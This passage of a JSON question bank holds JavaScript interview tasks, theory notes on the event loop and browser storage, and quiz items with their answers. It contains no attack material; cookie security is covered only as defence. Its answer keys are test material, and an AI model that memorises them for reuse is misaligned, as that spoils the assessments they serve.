post4)\n\nconsole.log('\\n4. Posts by Alice (userA):');\nconsole.log(getPostsByAuthor(blogAppState, 'userA').toJS());\n// Expected: 2 posts (post1, post3)\n\nconsole.log('\\n5. Posts with Author Name:');\nconsole.log(getPostWithAuthorName(blogAppState).toJS());\n/* Expected:\n[ { id: 'post1', ..., authorName: 'Alice' },\n  { id: 'post2', ..., authorName: 'Bob' },\n  { id: 'post3', ..., authorName: 'Alice' },\n  { id: 'post4', ..., authorName: 'Charlie' } ]\n*/\n\nconsole.log('\\n6. Popular Published Posts:');\nconsole.log(getPopularPublishedPosts(blogAppState).toJS());\n/* Expected (sorted by views desc):\n[ { id: 'post2', ..., views: 200 },\n  { id: 'post1', ..., views: 150 },\n  { id: 'post4', ..., views: 100 } ]\n*/\n\n// Test memoization (conceptual: calling again with same state should not re-compute)\nconsole.log('\\n--- Memoization Test (Conceptual) ---');\nconst firstCallPublished = getPublishedPosts(blogAppState);\nconst secondCallPublished = getPublishedPosts(blogAppState);\nconsole.log('getPublishedPosts (first call === second call):', firstCallPublished === secondCallPublished); // Should be true if memoized\n\nconst newStateDifferentUser = blogAppState.setIn(['users', 'userA', 'name'], 'Alicia');\nconst thirdCallPublished = getPublishedPosts(newStateDifferentUser); // Posts list is same reference\nconsole.log('getPublishedPosts (second call === third call, only user changed):', secondCallPublished === thirdCallPublished); // Should be true, as posts input hasn't changed\n\nconst newStateDifferentPost = blogAppState.setIn(['posts', 0, 'views'], 155);\nconst fourthCallPublished = getPublishedPosts(newStateDifferentPost); // Posts list is new reference\nconsole.log('getPublishedPosts (third call === fourth call, posts changed):', thirdCallPublished === fourthCallPublished); // Should be false, as input posts changed\n",
          "testCases": [
            "getAllPosts: returns all posts as an Immutable.List.",
            "getUsers: returns all users as an Immutable.Map.",
            "getPublishedPosts: filters correctly, returning only published posts.",
            "getPostsByAuthor: correctly filters posts by a given authorId.",
            "getPostWithAuthorName: correctly joins post data with author name, adding a new property.",
            "getPopularPublishedPosts: filters by views and published status, then sorts by views descending.",
            "Verify memoization (if `reselect` used): calling the same selector with unchanged inputs returns the same reference."
          ],
          "hints": [
            "Use `Immutable.List.prototype.filter()` for filtering based on conditions.",
            "Use `Immutable.List.prototype.map()` for transforming items in a list.",
            "For joining data (e.g., getting author name for a post), you'll need to access `users` data inside the selector. `Immutable.Map.prototype.get()` is useful here.",
            "`createSelector` takes an array of input selectors and a result function. The arguments to the result function are the outputs of the input selectors.",
            "For sorting, `Immutable.List.prototype.sortBy()` can be used.",
            "Remember that `Immutable.js` methods usually return new Immutable collections, so chained operations are common (e.g., `filter().map()`)."
          ],
          "tags": [
            "Redux",
            "Selectors",
            "Immutable.js",
            "Reselect",
            "State Management",
            "Data Transformation",
            "Interview Task"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "redux_selectors",
            "immutable_js_collections",
            "functional_programming_basics"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "memoization",
            "data_normalization",
            "performance_optimization"
          ]
        },
        {
          "id": "task_js_event_loop_prediction",
          "title": "Predict Execution Order with JavaScript Asynchronous Operations",
          "description": "\nAnalyze the provided JavaScript code snippet involving `setTimeout`, `Promise`, and synchronous operations. Your task is to predict the exact order of outputs to the console based on your understanding of the JavaScript Event Loop, Call Stack, and Microtask Queue.\n\n**Instructions:**\n1.  Read the code carefully.\n2.  Without running the code, write down the predicted output order.\n3.  For each `console.log`, explain *why* it appears at that specific point in the sequence, referencing the Call Stack, Web APIs, Microtask Queue, and Callback Queue (Task Queue) as appropriate.\n",
          "difficulty": "hard",
          "startingCode": "```javascript\nconsole.log('Start');\n\nsetTimeout(() => {\n  console.log('setTimeout 1');\n}, 0);\n\nPromise.resolve().then(() => {\n  console.log('Promise 1');\n});\n\nsetTimeout(() => {\n  console.log('setTimeout 2');\n  Promise.resolve().then(() => {\n    console.log('Promise 2 (nested)');\n  });\n}, 0);\n\nPromise.resolve().then(() => {\n  console.log('Promise 3');\n});\n\nconsole.log('End');\n```\n",
          "solutionCode": "```javascript\n/*\nPredicted Output Order and Explanation:\n\n1.  **'Start'**\n    *   `console.log('Start')` is a synchronous operation. It's immediately pushed onto the Call Stack and executed.\n    *   Call Stack: [`console.log('Start')`]\n    *   Output: `Start`\n\n2.  **'End'**\n    *   The `setTimeout` calls are asynchronous Web APIs. Their callbacks are registered and then moved to the Task Queue after their timer expires (even 0ms).\n        *   `setTimeout(() => { console.log('setTimeout 1'); }, 0);` -> Callback for 'setTimeout 1' added to Task Queue.\n        *   `setTimeout(() => { ... }, 0);` -> Callback for 'setTimeout 2' added to Task Queue.\n    *   The `Promise.resolve().then()` calls create microtasks. These microtasks are added to the Microtask Queue.\n        *   `Promise.resolve().then(() => { console.log('Promise 1'); });` -> Callback for 'Promise 1' added to Microtask Queue.\n        *   `Promise.resolve().then(() => { console.log('Promise 3'); });` -> Callback for 'Promise 3' added to Microtask Queue.\n    *   `console.log('End')` is synchronous. It's pushed onto the Call Stack and executed immediately after all other synchronous code.\n    *   Call Stack: [`console.log('End')`]\n    *   Output: `End`\n\n    *   At this point, the Call Stack is empty.\n    *   Microtask Queue: ['Promise 1' callback, 'Promise 3' callback]\n    *   Task Queue: ['setTimeout 1' callback, 'setTimeout 2' callback]\n\n3.  **'Promise 1'**\n    *   The Event Loop checks if the Call Stack is empty. It is.\n    *   It then checks the Microtask Queue. It processes *all* microtasks before moving to the Task Queue.\n    *   The first microtask, 'Promise 1' callback, is moved from Microtask Queue to Call Stack.\n    *   Call Stack: [`console.log('Promise 1')`]\n    *   Output: `Promise 1`\n\n4.  **'Promise 3'**\n    *   The Call Stack becomes empty after 'Promise 1' callback executes.\n    *   The Event Loop checks Microtask Queue again. It finds the 'Promise 3' callback.\n    *   'Promise 3' callback is moved to Call Stack.\n    *   Call Stack: [`console.log('Promise 3')`]\n    *   Output: `Promise 3`\n\n    *   At this point, the Microtask Queue is empty.\n\n5.  **'setTimeout 1'**\n    *   The Call Stack is empty.\n    *   The Microtask Queue is empty.\n    *   The Event Loop now moves to the Task Queue and takes the first task, 'setTimeout 1' callback.\n    *   Call Stack: [`console.log('setTimeout 1')`]\n    *   Output: `setTimeout 1`\n\n6.  **'setTimeout 2'**\n    *   The Call Stack is empty.\n    *   The Event Loop moves to the Task Queue and takes the next task, 'setTimeout 2' callback.\n    *   Call Stack: [`console.log('setTimeout 2')`, `Promise.resolve().then(() => { console.log('Promise 2 (nested)'); })`]\n    *   Output: `setTimeout 2`\n    *   Inside 'setTimeout 2' callback, `Promise.resolve().then()` is encountered. Its callback ('Promise 2 (nested)') is added to the Microtask Queue.\n    *   Microtask Queue: ['Promise 2 (nested)' callback] (now has a task)\n\n7.  **'Promise 2 (nested)'**\n    *   The Call Stack becomes empty after 'setTimeout 2' callback finishes.\n    *   The Event Loop checks the Microtask Queue. It finds the 'Promise 2 (nested)' callback.\n    *   'Promise 2 (nested)' callback is moved to Call Stack.\n    *   Call Stack: [`console.log('Promise 2 (nested)')`]\n    *   Output: `Promise 2 (nested)`\n\nFinal Predicted Output Sequence:\nStart\nEnd\nPromise 1\nPromise 3\nsetTimeout 1\nsetTimeout 2\nPromise 2 (nested)\n*/\n```",
          "testCases": [
            "Verify synchronous code executes first.",
            "Verify all top-level microtasks execute before any macrotasks (setTimeout callbacks).",
            "Verify nested microtasks (created within a macrotask) execute immediately after the macrotask completes, before the next macrotask."
          ],
          "hints": [
            "Remember the order of operations for the Event Loop: Call Stack -> Microtask Queue -> Task Queue (Callback Queue).",
            "Promises create microtasks, `setTimeout` creates macrotasks.",
            "The Event Loop processes *all* available microtasks *after* each macrotask completes and *before* taking the next macrotask.",
            "Synchronous code runs to completion before the event loop even starts checking queues."
          ],
          "tags": [
            "JavaScript",
            "Event Loop",
            "Call Stack",
            "Microtask Queue",
            "Macrotask Queue",
            "Asynchronous JavaScript",
            "Promise",
            "setTimeout",
            "Interview Task"
          ],
          "timeEstimate": 50,
          "prerequisites": [
            "javascript_engine_fundamentals",
            "async_await_basics"
          ],
          "complexity": 9,
          "interviewRelevance": 10,
          "learningPath": "expert",
          "relatedConcepts": [
            "concurrency_model",
            "web_apis",
            "nodejs_runtime"
          ]
        }
      ]
    }
  },
  {
    "id": "5e05e678-a3c2-41d6-900a-836eaa400f4d",
    "startLine": 10900,
    "endLine": 10999,
    "processedDate": "2025-06-17T11:57:07.253Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_event_loop_async_js",
          "title": "JavaScript Event Loop and Asynchronous Execution",
          "content": "## Core Concepts\nJavaScript engines are inherently **single-threaded**, meaning they can only perform one operation at a time. This single-threaded nature is crucial to understand how JavaScript processes code.\n\nWhile the main JavaScript thread executes code synchronously, blocking the interface until operations complete, **Web APIs** (provided by the browser environment, not the JavaScript engine itself) manage asynchronous operations. These Web APIs include functionalities like `setTimeout`, `fetch`, DOM events, and more.\n\nWhen an asynchronous operation initiated by a Web API completes, its associated callback function is not immediately executed. Instead, it's placed into the **Callback Queue** (also known as the Task Queue or Macrotask Queue).\n\nThe **Event Loop** is a continuously running process that acts as the bridge between the Callback Queue and the Call Stack. Its primary responsibility is to check if the Call Stack is empty. If the Call Stack is empty, the Event Loop takes the first message (callback function) from the Callback Queue and pushes it onto the Call Stack for execution. This ensures that non-blocking, asynchronous operations do not interfere with the execution of synchronous code and maintain UI responsiveness.\n\n## Practical Application: Zero Delay `setTimeout`\nUsing `setTimeout` with a zero delay (`setTimeout(callback, 0)`) is a common pattern to defer the execution of a function until the current Call Stack is completely cleared. This means the callback will run after all currently executing functions and any pending synchronous code have finished, but before any new asynchronous tasks (that might have been added to the queue later) are processed. It's useful for scenarios where you want to execute code after the UI has potentially rendered or updated, or to break up long-running synchronous tasks into smaller, non-blocking chunks.",
          "examples": [
            {
              "id": "example_event_loop_1",
              "title": "Basic Asynchronous Flow with setTimeout",
              "code": "console.log('Start');\n\nsetTimeout(() => {\n  console.log('Inside setTimeout callback (0ms delay)');\n}, 0);\n\nconsole.log('End');\n\n/*\nExpected Output:\nStart\nEnd\nInside setTimeout callback (0ms delay)\n\nExplanation:\n1. 'Start' is logged immediately.\n2. setTimeout schedules its callback with the Web API. Even with 0ms delay, it's an async operation.\n3. 'End' is logged immediately because setTimeout is non-blocking.\n4. Once the Call Stack is empty (after 'End' is logged), the Event Loop moves the setTimeout callback from the Callback Queue to the Call Stack.\n5. The callback executes, logging 'Inside setTimeout callback (0ms delay)'.\n*/",
              "explanation": "This example illustrates the fundamental concept of the Event Loop. Synchronous code (`console.log('Start')`, `console.log('End')`) executes first. The `setTimeout` callback is offloaded to the Web API and then placed in the callback queue, only to be processed once the main call stack is empty, demonstrating non-blocking behavior.",
              "language": "typescript"
            },
            {
              "id": "example_event_loop_2",
              "title": "Deferring UI Updates with setTimeout(0)",
              "code": "function performComplexCalculation() {\n  let sum = 0;\n  for (let i = 0; i < 1000000000; i++) {\n    sum += i;\n  }\n  return sum;\n}\n\nconst statusElement = document.getElementById('status');\n\nif (statusElement) {\n  statusElement.textContent = 'Calculating...';\n}\n\n// This will block the UI until calculation is done if not deferred\n// performComplexCalculation();\n\n// Defer the heavy calculation to avoid blocking UI update immediately\nsetTimeout(() => {\n  const result = performComplexCalculation();\n  if (statusElement) {\n    statusElement.textContent = `Calculation complete: ${result}`;\n  }\n  console.log('Heavy calculation finished.');\n}, 0); \n\nconsole.log('UI updated and calculation deferred.');\n\n// Assume there's an HTML element with id='status'\n// <div id=\"status\"></div>\n",
              "explanation": "This example demonstrates a practical use case for `setTimeout(0)`. By wrapping a computationally intensive function (`performComplexCalculation`) in `setTimeout(0)`, we ensure that the initial UI update (`statusElement.textContent = 'Calculating...'`) is rendered before the heavy calculation blocks the thread. This makes the application feel more responsive.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_event_loop_1",
            "question_event_loop_2",
            "question_event_loop_3",
            "question_event_loop_4",
            "question_event_loop_5"
          ],
          "relatedTasks": [
            "task_event_loop_1"
          ],
          "tags": [
            "JavaScript",
            "Asynchronous",
            "Event Loop",
            "Concurrency",
            "Web APIs"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "Basic JavaScript Syntax",
            "Understanding of Functions",
            "DOM Manipulation (for UI examples)"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "Promises",
            "Async/Await",
            "Understanding browser rendering",
            "Performance Optimization"
          ]
        },
        {
          "id": "theory_web_storage_apis",
          "title": "Web Storage APIs: Cookies, Local Storage, and Session Storage",
          "content": "## Overview of Client-Side Data Storage\nWeb browsers provide several mechanisms for client-side data storage, each with distinct characteristics regarding capacity, duration, accessibility, and security. Understanding these differences is crucial for choosing the right storage solution for different use cases.\n\n## Storage Types Comparison\n\n| Feature           | **Cookie**                                  | **Local Storage**                                 | **Session Storage**                                 |\n| :---------------- | :------------------------------------------ | :------------------------------------------------ | :-------------------------------------------------- |\n| **Initiator**     | Client or server. Server uses `Set-Cookie` header. | Client (JavaScript only)                            | Client (JavaScript only)                              |\n| **Capacity**      | ~4KB per domain                             | 5-10MB per domain                                 | 5-10MB per domain                                   |\n| **Storage Duration** | Manually set expiration date; can be session-based. | Permanent (persists until explicitly deleted by code or user clearing browser data) | Until the browser tab/window is closed             |\n| **Persistence between sessions** | Depends on expiration setting; persists if expiration is set. | Yes                                               | No                                                  |\n| **Sent with requests** | Yes, automatically with every HTTP request to the associated domain. | No                                                | No                                                  |\n| **Domain Association** | Yes, associated with a specific domain and path. | Yes, scoped to the origin (protocol + host + port). | Yes, scoped to the origin (protocol + host + port). |\n| **Accessibility** | Any window/tab from the associated domain.  | Any window/tab from the same origin.              | Same tab only (not accessible by other tabs, even from the same origin). |\n| **APIs**          | `document.cookie` (string-based, requires parsing/serialization) | `localStorage.getItem()`, `localStorage.setItem()`, `localStorage.removeItem()`, `localStorage.clear()` | `sessionStorage.getItem()`, `sessionStorage.setItem()`, `sessionStorage.removeItem()`, `sessionStorage.clear()` |\n| **Security**      | Can be marked as `Secure` (HTTPS only) and `HttpOnly` (inaccessible to JavaScript). Vulnerable to CSRF without proper defenses. | Cannot be marked as `HttpOnly`, accessible to any JavaScript from the same origin. Vulnerable to XSS. | Cannot be marked as `HttpOnly`, accessible to any JavaScript from the same origin. Vulnerable to XSS. |\n| **Use Cases**     | Session management, tracking, maintaining stateful information (e.g., authentication tokens). | Long-term persistence of user preferences, offline data storage, non-sensitive application state. | Temporary data storage during a single page session (e.g., multi-step form data, temporary user input). |\n\n## Example Usage\n\n```typescript\n// Cookies\n// Setting a cookie with an expiration date, secure flag, and samesite policy\ndocument.cookie = \"username=JohnDoe; expires=Thu, 18 Dec 2025 12:00:00 UTC; path=/; Secure; SameSite=Strict\";\n\n// Reading cookies (requires manual parsing)\nconst getCookie = (name: string): string | undefined => {\n  const value = `; ${document.cookie}`;\n  const parts = value.split(`; ${name}=`);\n  if (parts.length === 2) {\n    return parts.pop()?.split(';').shift();\n  }\n  return undefined;\n};\nconst usernameFromCookie = getCookie('username');\nconsole.log('Cookie Username:', usernameFromCookie);\n\n// Local Storage\n// Storing an object (requires stringification)\nlocalStorage.setItem('userProfile', JSON.stringify({ name: 'John', role: 'admin', lastLogin: new Date() }));\n\n// Retrieving and parsing an item\nconst userProfileString = localStorage.getItem('userProfile');\nconst userProfile = userProfileString ? JSON.parse(userProfileString) : null;\nconsole.log('Local Storage User Profile:', userProfile);\n\n// Removing a specific item\nlocalStorage.removeItem('userProfile');\n\n// Clearing all items from local storage for the current origin\n// localStorage.clear(); // Use with caution, removes all data!\n\n// Session Storage\n// Storing a simple string\nsessionStorage.setItem('sessionId', 'abc123XYZ');\n\n// Retrieving an item\nconst currentSessionId = sessionStorage.getItem('sessionId');\nconsole.log('Session Storage Session ID:', currentSessionId);\n\n// Removing a specific item\nsessionStorage.removeItem('sessionId');\n\n// Clearing all items from session storage for the current origin and tab\n// sessionStorage.clear(); // Use with caution, removes all data!\n```\n\n## Storage Events\nChanges to `localStorage` (but not `sessionStorage` or `document.cookie`) can trigger a `storage` event in other browser windows or tabs from the **same origin**. This event is fired on the `window` object of those other tabs, allowing for cross-tab communication or synchronization. The event object contains properties like `key`, `oldValue`, `newValue`, `url`, and `storageArea`, providing details about the change.\n\n```typescript\n// Example of listening for storage events\nwindow.addEventListener('storage', (event) => {\n  // Check if the event is from localStorage and the key you care about\n  if (event.storageArea === localStorage) {\n    console.log(`LocalStorage changed: Key='${event.key}', OldValue='${event.oldValue}', NewValue='${event.newValue}', URL='${event.url}'`);\n    // Perform actions based on the change, e.g., update UI\n  }\n});\n\n// In another tab, if you do:\n// localStorage.setItem('theme', 'dark');\n// The event listener above would trigger in this tab.\n```",
          "examples": [
            {
              "id": "example_web_storage_1",
              "title": "Cookie Operations",
              "code": "// Setting a cookie with specific attributes\ndocument.cookie = \"user_pref=dark_theme; expires=Fri, 31 Dec 2027 23:59:59 UTC; path=/; Secure; SameSite=Lax\";\n\n// A utility function to get a cookie by name\nconst getCookieByName = (name: string): string | null => {\n  const nameEQ = name + \"=\";\n  const ca = document.cookie.split(';');\n  for(let i=0; i < ca.length; i++) {\n    let c = ca[i];\n    while (c.charAt(0)==' ') c = c.substring(1, c.length);\n    if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);\n  }\n  return null;\n};\n\nconst theme = getCookieByName('user_pref');\nconsole.log('Current theme preference from cookie:', theme);\n\n// Deleting a cookie (by setting expiration to a past date)\ndocument.cookie = \"user_pref=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;\";\nconsole.log('Cookie after deletion attempt:', getCookieByName('user_pref'));",
              "explanation": "This example demonstrates how to set a cookie with various attributes like expiration, path, `Secure`, and `SameSite`. It also includes a common utility function to read a cookie by its name, highlighting the manual parsing required for `document.cookie`. Finally, it shows how to 'delete' a cookie by setting its expiration date to a past time.",
              "language": "typescript"
            },
            {
              "id": "example_web_storage_2",
              "title": "Managing User Preferences with Local Storage",
              "code": "interface UserSettings {\n  darkMode: boolean;\n  fontSize: number;\n  notifications: boolean;\n}\n\nconst defaultSettings: UserSettings = {\n  darkMode: false,\n  fontSize: 16,\n  notifications: true,\n};\n\n// Save settings to local storage\nconst saveSettings = (settings: UserSettings) => {\n  localStorage.setItem('userSettings', JSON.stringify(settings));\n  console.log('Settings saved:', settings);\n};\n\n// Load settings from local storage, or return defaults\nconst loadSettings = (): UserSettings => {\n  const settingsString = localStorage.getItem('userSettings');\n  if (settingsString) {\n    try {\n      return JSON.parse(settingsString);\n    } catch (e) {\n      console.error('Error parsing settings from local storage:', e);\n      return defaultSettings;\n    }\n  }\n  return defaultSettings;\n};\n\n// Usage\nlet currentSettings = loadSettings();\nconsole.log('Initial settings:', currentSettings);\n\n// Update a setting\ncurrentSettings.darkMode = true;\ncurrentSettings.fontSize = 18;\nsaveSettings(currentSettings);\n\n// Load again to verify\ncurrentSettings = loadSettings();\nconsole.log('Updated settings:', currentSettings);\n\n// Clear settings for demonstration\n// localStorage.removeItem('userSettings');\n// console.log('Settings after removal:', loadSettings());",
              "explanation": "This example shows a practical application of `localStorage` for persisting user preferences. It demonstrates the use of `JSON.stringify` and `JSON.parse` for storing and retrieving complex JavaScript objects, as `localStorage` only stores strings. It also includes basic error handling for parsing and provides default settings if no saved settings are found.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_web_storage_1",
            "question_web_storage_2",
            "question_web_storage_3",
            "question_web_storage_4",
            "question_web_storage_5",
            "question_web_storage_6",
            "question_web_storage_7",
            "question_web_storage_8",
            "question_web_storage_9"
          ],
          "relatedTasks": [
            "task_web_storage_1",
            "task_web_storage_2"
          ],
          "tags": [
            "Web APIs",
            "Client-Side Storage",
            "Cookies",
            "Local Storage",
            "Session Storage",
            "Browser Features",
            "Security"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "JSON Serialization/Deserialization",
            "Basic JavaScript Objects",
            "Understanding of HTTP"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "Authentication Systems",
            "Offline-first Applications",
            "User Experience Enhancement"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_event_loop_1",
          "topic": "JavaScript Engine and Event Loop Basics",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the fundamental characteristic of a JavaScript engine regarding operation execution?",
          "answer": "A JavaScript engine is single-threaded, meaning it can only perform one operation at a time.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Single-threaded",
            "JavaScript Engine"
          ],
          "evaluationCriteria": [
            "Recall of fundamental JavaScript engine characteristic"
          ],
          "example": "",
          "tags": [
            "JavaScript",
            "Event Loop",
            "Fundamentals"
          ],
          "prerequisites": [],
          "complexity": 2,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_event_loop_2",
          "topic": "Role of Web APIs",
          "level": "easy",
          "type": "open",
          "question": "How do Web APIs (like `setTimeout` or `fetch`) interact with the JavaScript engine's single-threaded nature to enable asynchronous operations?",
          "answer": "Web APIs are provided by the browser environment (not the JavaScript engine itself) and handle asynchronous tasks in the background, offloading them from the main JavaScript thread. Once these operations complete, their associated callback functions are placed into the Callback Queue, allowing the JavaScript engine to remain non-blocked while waiting.",
          "options": [],
          "analysisPoints": [
            "Understanding that Web APIs are outside the JS engine.",
            "Role of Web APIs in offloading asynchronous tasks.",
            "How callbacks are queued upon completion."
          ],
          "keyConcepts": [
            "Web APIs",
            "Asynchronous JavaScript",
            "Non-blocking operations"
          ],
          "evaluationCriteria": [
            "Understanding the separation of concerns between JS engine and browser APIs.",
            "Ability to explain the flow of asynchronous operations."
          ],
          "example": "",
          "tags": [
            "JavaScript",
            "Web APIs",
            "Asynchronous"
          ],
          "prerequisites": [
            "Event Loop Basics"
          ],
          "complexity": 4,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_event_loop_3",
          "topic": "Event Loop and Call Stack",
          "level": "medium",
          "type": "mcq",
          "question": "Which statement accurately describes the primary role of the Event Loop in JavaScript's concurrency model?",
          "answer": "The Event Loop continuously checks if the Call Stack is empty and, if so, moves callback functions from the Callback Queue to the Call Stack for execution.",
          "options": [
            "The Event Loop immediately executes any function that enters the Callback Queue.",
            "The Event Loop is responsible for executing synchronous code before asynchronous code.",
            "The Event Loop directly places asynchronous operations into the Call Stack without using a queue.",
            "The Event Loop continuously checks if the Call Stack is empty and, if so, moves callback functions from the Callback Queue to the Call Stack for execution."
          ],
          "analysisPoints": [
            "The Event Loop's role is to mediate between the Callback Queue and the Call Stack.",
            "It only acts when the Call Stack is empty, ensuring synchronous code completes first.",
            "It's a continuous process, not a one-time execution."
          ],
          "keyConcepts": [
            "Event Loop",
            "Call Stack",
            "Callback Queue",
            "Asynchronous execution order"
          ],
          "evaluationCriteria": [
            "Accurate understanding of the Event Loop's function.",
            "Distinction between Call Stack and Callback Queue interactions.",
            "Recognition of the 'empty stack' condition."
          ],
          "example": "The Event Loop is crucial for non-blocking I/O. For instance, when `fetch()` completes, its callback goes to the queue. The Event Loop waits for the main thread's Call Stack to be empty before pushing that `fetch` callback onto the Call Stack for execution.",
          "tags": [
            "JavaScript",
            "Event Loop",
            "Concurrency"
          ],
          "prerequisites": [
            "Event Loop Basics"
          ],
          "complexity": 6,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_event_loop_4",
          "topic": "Zero Delay setTimeout",
          "level": "medium",
          "type": "code",
          "question": "Given the following JavaScript code, what will be the exact order of `console.log` outputs? Explain your reasoning.",
          "answer": "1. First\n2. Third\n3. Second",
          "options": [],
          "analysisPoints": [
            "Understanding that `setTimeout(callback, 0)` still places the callback in the queue.",
            "Synchronous code always executes before any callbacks from the message queue.",
            "The current Call Stack must be empty before the Event Loop pushes queued tasks."
          ],
          "keyConcepts": [
            "setTimeout",
            "Zero delay",
            "Event Loop",
            "Execution order",
            "Synchronous vs. Asynchronous"
          ],
          "evaluationCriteria": [
            "Correct prediction of output order.",
            "Clear explanation of Event Loop mechanism for `setTimeout(0)`.",
            "Demonstrates understanding of synchronous priority."
          ],
          "example": "```javascript\nconsole.log('First');\n\nsetTimeout(() => {\n  console.log('Second');\n}, 0);\n\nconsole.log('Third');\n\n// Explanation:\n// 1. 'First' is logged immediately.\n// 2. setTimeout callback is sent to Web APIs, then moved to Callback Queue.\n// 3. 'Third' is logged immediately as it's synchronous code.\n// 4. The Call Stack becomes empty.\n// 5. The Event Loop moves 'Second' callback from Callback Queue to Call Stack.\n// 6. 'Second' is logged.\n```",
          "tags": [
            "JavaScript",
            "Asynchronous",
            "Event Loop",
            "setTimeout"
          ],
          "prerequisites": [
            "Event Loop Basics",
            "Functions"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_event_loop_5",
          "topic": "Synchronous Execution Blocking",
          "level": "easy",
          "type": "flashcard",
          "question": "What is a direct consequence of long-running synchronous JavaScript execution in a browser environment?",
          "answer": "It blocks the user interface (UI), making the application unresponsive.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Synchronous execution",
            "UI blocking",
            "Responsiveness"
          ],
          "evaluationCriteria": [
            "Recall of the impact of synchronous code."
          ],
          "example": "",
          "tags": [
            "JavaScript",
            "Performance",
            "UI/UX"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_web_storage_1",
          "topic": "Cookies vs. Local Storage vs. Session Storage - Capacity",
          "level": "easy",
          "type": "flashcard",
          "question": "Which client-side storage mechanism generally offers the largest storage capacity?",
          "answer": "Both Local Storage and Session Storage (5-10MB per domain). Cookies typically offer only around 4KB.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Storage Capacity",
            "Cookies",
            "Local Storage",
            "Session Storage"
          ],
          "evaluationCriteria": [
            "Recall of storage limits."
          ],
          "example": "",
          "tags": [
            "Web APIs",
            "Client-Side Storage"
          ],
          "prerequisites": [],
          "complexity": 2,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_web_storage_2",
          "topic": "Cookies - HttpOnly and Secure flags",
          "level": "medium",
          "type": "open",
          "question": "Explain the purpose of the `HttpOnly` and `Secure` flags when setting a cookie. Why are they important for security?",
          "answer": "The `HttpOnly` flag prevents client-side JavaScript from accessing the cookie via `document.cookie`. This significantly reduces the risk of Cross-Site Scripting (XSS) attacks, where an attacker might inject malicious JavaScript to steal session cookies.\n\nThe `Secure` flag ensures that the cookie is only sent over encrypted HTTPS connections. This protects the cookie from being intercepted and read by attackers during transit over unencrypted networks. Both flags are crucial for protecting sensitive information (like session tokens) stored in cookies from different types of attacks.",
          "options": [],
          "analysisPoints": [
            "Clear explanation of `HttpOnly`'s prevention mechanism (JS access).",
            "Clear explanation of `Secure`'s prevention mechanism (HTTPS only).",
            "Connecting these flags to specific attack types (XSS, interception)."
          ],
          "keyConcepts": [
            "Cookies",
            "Security",
            "HttpOnly",
            "Secure",
            "XSS",
            "HTTPS"
          ],
          "evaluationCriteria": [
            "Understanding of cookie security attributes.",
            "Ability to relate attributes to specific security vulnerabilities.",
            "Clarity and completeness of explanation."
          ],
          "example": "",
          "tags": [
            "Web APIs",
            "Cookies",
            "Security",
            "Frontend Security"
          ],
          "prerequisites": [
            "Basic understanding of HTTP/HTTPS",
            "Understanding of XSS attacks"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_web_storage_3",
          "topic": "Persistence and Scope",
          "level": "medium",
          "type": "mcq",
          "question": "A user logs into a web application and closes the browser tab. Upon reopening the *same* tab later, the user is still logged in. Which storage mechanism was most likely used to maintain the login state, assuming no server-side session management beyond token storage?",
          "answer": "A persistent Cookie or Local Storage",
          "options": [
            "Session Storage",
            "A session Cookie only",
            "A persistent Cookie or Local Storage",
            "Only a temporary variable in JavaScript"
          ],
          "analysisPoints": [
            "Session Storage is cleared when the tab closes.",
            "A session cookie is cleared when the browser session ends (often on browser close, not just tab close).",
            "Persistent cookies and Local Storage are designed to persist across browser sessions/tabs until explicitly removed or expired."
          ],
          "keyConcepts": [
            "Persistence",
            "Session",
            "Local Storage",
            "Cookies",
            "Session Storage"
          ],
          "evaluationCriteria": [
            "Distinguishing persistence behaviors of different storage types.",
            "Applying knowledge to a common use case (login state)."
          ],
          "example": "If a `Remember Me` checkbox is selected during login, the application would typically store an authentication token in `localStorage` or a cookie with a far-future expiration date. This allows the user to remain logged in even after closing and reopening the browser.",
          "tags": [
            "Web APIs",
            "Client-Side Storage",
            "Login",
            "Authentication"
          ],
          "prerequisites": [],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_web_storage_4",
          "topic": "Accessibility and Cross-Tab Communication",
          "level": "medium",
          "type": "mcq",
          "question": "You want to store temporary data that is specific to the user's current browsing session and should *not* persist if the tab is closed, nor be accessible from other tabs. Which Web Storage API should you use?",
          "answer": "Session Storage",
          "options": [
            "Local Storage",
            "Cookies",
            "Session Storage",
            "IndexedDB"
          ],
          "analysisPoints": [
            "Local Storage persists and is accessible across tabs of the same origin.",
            "Cookies can persist and are accessible across tabs (if same domain/path).",
            "Session Storage is specifically tied to the current tab and cleared on tab closure.",
            "IndexedDB is for structured client-side data, but doesn't match the 'single tab, temporary' requirement as precisely as Session Storage."
          ],
          "keyConcepts": [
            "Session Storage",
            "Tab scope",
            "Temporary data",
            "Accessibility"
          ],
          "evaluationCriteria": [
            "Correctly identifying the most suitable storage type based on specific requirements.",
            "Understanding the scope limitations of Session Storage."
          ],
